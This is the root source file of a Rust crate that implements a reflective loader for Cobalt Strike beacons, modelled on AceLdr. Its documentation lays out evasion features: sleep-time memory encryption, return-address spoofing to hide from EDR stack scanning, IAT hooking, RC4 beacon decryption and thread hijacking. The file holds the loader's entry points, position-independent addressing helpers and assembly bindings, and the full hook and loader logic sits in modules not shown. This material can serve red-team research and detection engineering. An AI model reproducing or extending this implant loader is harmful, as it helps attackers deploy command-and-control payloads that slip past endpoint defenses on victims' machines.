//! UDRL (User-Defined Reflective Loader) for Cobalt Strike.
//!
//! # Overview
//!
//! This crate implements a position-independent reflective loader for Cobalt Strike
//! beacons, written entirely in Rust with inline assembly. It provides:
//!
//! - **Reflective PE loading** - Maps beacon PE into memory and resolves imports/relocations
//! - **IAT hooking** - Intercepts beacon API calls for custom behavior
//! - **Sleep obfuscation** - FOLIAGE-style memory encryption during sleep
//! - **Return address spoofing** - Hides call origins from EDR stack scanners
//! - **Isolated heap** - Custom heap for beacon allocations
//!
//! # Architecture
//!
//! ```text
//! ┌─────────────────────────────────────────────────────────────┐
//! │ Entry/Start (assembly)                                       │
//! │  ↓                                                           │
//! │ ace() → Creates thread, hijacks RIP to loader()             │
//! │  ↓                                                           │
//! │ loader() → Maps beacon, installs hooks, executes DllMain    │
//! │  ↓                                                           │
//! │ Beacon runs with hooked APIs (heap, sleep, network)         │
//! └─────────────────────────────────────────────────────────────┘
//! ```
//!
//! # Memory Layout
//!
//! ```text
//! [STUB metadata][Loader code][Hook code][Beacon PE sections]
//!  ^-- STUB       ^-- .text$B  ^-- .text$D ^-- mapped image
//! ```
//!
//! # Key Modules
//!
//! - `ace` - Thread creation and RIP hijacking
//! - `loader` - PE mapping, IAT patching, relocation processing
//! - `crypto` - Runtime beacon decryption (RC4)
//! - `hooks` - IAT hook implementations (GetProcessHeap, Sleep, etc.)
//! - `sleep` - FOLIAGE sleep obfuscation with APC chains
//! - `spoof` - Return address spoofing using ROP gadgets
//! - `api` - Windows API resolution and storage
//! - `util` - PE parsing, memory operations, hash functions
//! - `windows` - Windows type definitions and constants
//! - `log` - Debug logging (feature-gated)
//!
//! # Build Requirements
//!
//! - `#![no_std]` - No standard library (position-independent)
//! - `#![no_main]` - Custom entry points (assembly-defined)
//! - Assembly files (start.asm, misc.asm) linked via `asm` library
//!
//! # AceLdr Compatibility
//!
//! This loader mirrors the behavior and structure of AceLdr (C implementation)
//! to ensure compatibility with Cobalt Strike beacon expectations.

#![no_std]
#![no_main]
#![allow(non_snake_case)]
#![allow(unused_variables, unused_imports)]
#![feature(lang_items)]
#![allow(internal_features)]
#![allow(integer_to_ptr_transmutes)]
#![feature(stmt_expr_attributes)]

// Import modules
mod ace;
mod crypto;
mod hooks;
mod loader;
// mod log; // Disabled: using dbg_print! macro instead (see util.rs)

// Re-export key components
use core::{ffi::c_void, panic::PanicInfo};
pub use {api::windows::*, loader::*};
pub mod windows {
    pub use api::windows::*;
}
#[cfg(feature = "spoof-uwd")]
pub use uwd::spoof_uwd;

/// External assembly functions and symbols from start.asm and misc.asm.
///
/// # Assembly Integration
///
/// These functions are implemented in x64/x86 assembly and linked via the `asm` library.
/// They provide position-independent primitives that Rust cannot safely implement:
///
/// - **Start** - Assembly entry point, initializes execution
/// - **GetIp** - Returns current instruction pointer (RIP-relative addressing)
/// - **StubAddr** - Returns base address of STUB structure
/// - **Stub** - STUB metadata symbol marker
/// - **Spoof** - Return address spoofing trampoline using ROP gadgets
///
/// # Platform Support
///
/// Functions are architecture-specific with different implementations for:
/// - x64 (x64/start.asm, x64/misc.asm)
/// - x86 (x86/start.asm, x86/misc.asm) - Uses `link_name` attribute for mangling
#[allow(unused_doc_comments)]
#[link(name = "asm")]
extern "C" {
    /// Assembly entry point that sets up execution and calls Rust Entry().
    #[cfg_attr(target_arch = "x86", link_name = "Start")]
    pub fn Start() -> ULONG_PTR;

    /// Returns the current instruction pointer (RIP/EIP) for position-independent calculations.
    #[cfg_attr(target_arch = "x86", link_name = "GetIp")]
    pub fn GetIp() -> ULONG_PTR;

    /// Returns the base address of the STUB metadata structure.
    #[cfg_attr(target_arch = "x86", link_name = "StubAddr")]
    pub fn StubAddr() -> ULONG_PTR;

    /// STUB metadata structure symbol (used as marker for address calculations).
    #[cfg_attr(target_arch = "x86", link_name = "Stub")]
    pub static mut Stub: u8;

}

/// Converts a pointer to ULONG_PTR (unsigned pointer-sized integer).
///
/// # Purpose
///
/// Type-safe conversion from any pointer type to ULONG_PTR for address arithmetic
/// and storage. Always inlined for zero-cost abstraction.
///
/// # Arguments
///
/// * `value` - Pointer of any type to convert
///
/// # Returns
///
/// ULONG_PTR representation of the pointer address
#[inline(always)]
pub fn U_PTR<T>(value: *const T) -> ULONG_PTR {
    value as ULONG_PTR
}

/// Converts ULONG_PTR to a typed pointer.
///
/// # Purpose
///
/// Type-safe conversion from ULONG_PTR back to a typed pointer for dereferencing.
/// Always inlined for zero-cost abstraction.
///
/// # Arguments
///
/// * `value` - ULONG_PTR value representing an address
///
/// # Returns
///
/// Mutable pointer of specified type
#[inline(always)]
pub fn C_PTR<T>(value: ULONG_PTR) -> *mut T {
    value as *mut T
}

/// Calculates position-independent offset for a symbol address.
///
/// # Purpose
///
/// Converts a compile-time symbol address to a runtime offset using RIP-relative
/// addressing. This enables position-independent code without relocations.
///
/// # How It Works
///
/// ```text
/// Runtime IP:        GetIp() returns current RIP
/// Compile-time IP:   GetIp as function pointer
/// Symbol offset:     GetIp - symbol (compile-time distance)
/// Runtime symbol:    GetIp() - (GetIp - symbol)
/// ```
///
/// # Arguments
///
/// * `symbol` - Compile-time address of the symbol to calculate offset for
///
/// # Returns
///
/// Runtime address of the symbol (position-independent)
///
/// # Safety
///
/// Assumes GetIp() returns valid instruction pointer and symbol is in same module
#[inline(always)]
pub unsafe fn OFFSET(symbol: ULONG_PTR) -> ULONG_PTR {
    GetIp().wrapping_sub((GetIp as *const () as ULONG_PTR).wrapping_sub(symbol))
}

/// Returns the address where the loader code ends (G_END).
///
/// # Purpose
///
/// Calculates the position where the loader code ends and the CONFIG struct begins.
/// The CONFIG struct is appended by the CNA script and contains the encrypted beacon.
/// The +11 offset accounts for the call instruction size and alignment.
///
/// # How It Works
///
/// ```text
/// GetIp() + 11 bytes = End of loader code
///                      [CONFIG struct][Encrypted beacon]
/// ```
///
/// # Returns
///
/// Runtime address where loader code ends (CONFIG struct starts here)
///
/// # Safety
///
/// Assumes GetIp() is called from within the loader and +11 offset is correct
#[inline(always)]
pub unsafe fn G_END() -> ULONG_PTR {
    GetIp().wrapping_add(11)
}

/// Primary Rust entry point called from assembly Start() function.
///
/// # Purpose
///
/// This is the main entry point for the reflective loader after assembly initialization.
/// It immediately delegates to ace::ace() which handles thread creation and loader execution.
///
/// # Execution Flow
///
/// ```text
/// Start (assembly) → Entry (Rust) → ace() → loader() → beacon
/// ```
///
/// # Section Placement
///
/// Placed in `.text$B` so assembly code in `.text$A` comes first, ensuring the
/// assembly entry point (Start) is at the beginning of the .text section.
///
/// # Arguments
///
/// * `args` - Argument pointer passed from assembly (may be NULL)
///
/// # AceLdr Compatibility
///
/// Exported with `Entry` symbol for compatibility with AceLdr conventions.
#[no_mangle]
#[link_section = ".text$B"]
pub unsafe extern "C" fn Entry(args: *mut c_void) {
    // Call ACE loader
    ace::ace(args);
}

/// Alternate Rust entry point (underscore prefix variant).
///
/// # Purpose
///
/// Some loaders/injection methods expect an `_Entry` symbol instead of `Entry`.
/// This provides compatibility with both naming conventions.
///
/// # Arguments
///
/// * `args` - Argument pointer passed from caller (may be NULL)
///
/// # Implementation
///
/// Identical to Entry(), simply delegates to ace::ace()
#[no_mangle]
#[link_section = ".text$B"]
pub unsafe extern "C" fn _Entry(args: *mut c_void) {
    // Call ACE loader
    ace::ace(args);
}

/// Panic handler for #![no_std] environment.
///
/// # Purpose
///
/// Required by Rust for #![no_std] crates. In shellcode, panics are fatal and
/// unrecoverable, so we simply enter an infinite loop instead of unwinding.
///
/// # Behavior
///
/// Enters infinite loop on panic (no stack unwinding, no error reporting).
/// This prevents the loader from crashing the host process unpredictably.
///
/// # Why Infinite Loop?
///
/// - No stack unwinding (would break position-independent code)
/// - No error output (stealth requirement)
/// - Keeps thread alive (prevents crash)
#[cfg(not(test))]
#[panic_handler]
fn panic(_info: &PanicInfo) -> ! {
    loop {}
}

/// Exception handling personality function (no-op).
///
/// # Purpose
///
/// Required by Rust for exception handling setup. In #![no_std] with no unwinding,
/// this is never called but must exist to satisfy the compiler.
///
/// # Note
///
/// This function should never be invoked in normal execution.
#[cfg(not(test))]
#[lang = "eh_personality"]
extern "C" fn rust_eh_personality() {}

/// ARM EABI unwind function (no-op).
///
/// # Purpose
///
/// Required for ARM targets to satisfy the EABI (Embedded Application Binary Interface)
/// unwinding requirements. Enters infinite loop if called.
///
/// # Note
///
/// This function should never be invoked on x64/x86 targets.
#[no_mangle]
pub unsafe extern "C" fn __aeabi_unwind_cpp_pr0() {
    loop {}
}
